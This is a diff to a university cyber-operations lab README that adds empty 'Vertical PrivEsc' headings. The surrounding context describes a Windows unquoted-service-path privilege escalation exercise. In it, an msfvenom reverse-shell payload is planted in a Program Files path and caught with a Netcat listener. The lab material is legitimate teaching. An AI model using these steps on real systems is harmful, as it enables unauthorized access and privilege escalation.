@@ -32,6 +32,8 @@ Created for DSU's Cyber Operations I course
 8. Restart the box.
 9. Open the Services MMC snap-in. The `[Service Name]` should appear in the list. Ensure the startup type is set to Automatic so it executes when the box starts.
 
+#### Vertical PrivEsc
+
 ### Exploitation
 #### Horizontal PrivEsc via Unquoted Service Path
 1. Log on to the second user created in Configuration step 1.
@@ -47,6 +49,8 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<IP address of Linux Exercises box> 
 2. SCP the generated file from the LInux Exercises box to `C:\Program Files\[Level 1 Name]` on the Windows Exercises box.
 3. Start a Netcat listener on the Linux Exercises box with `nc -nvlp 1337`.
 4. Restart the Windows Exercises box. A Windows shell should spawn in the Netcat session with the permissions of the first user. Use `whoami` to verify this.
+
+#### Vertical PrivEsc
 
 ## Lab Exercise 2: Linux Horziontal PrivEsc via SUID
 ### Configuration
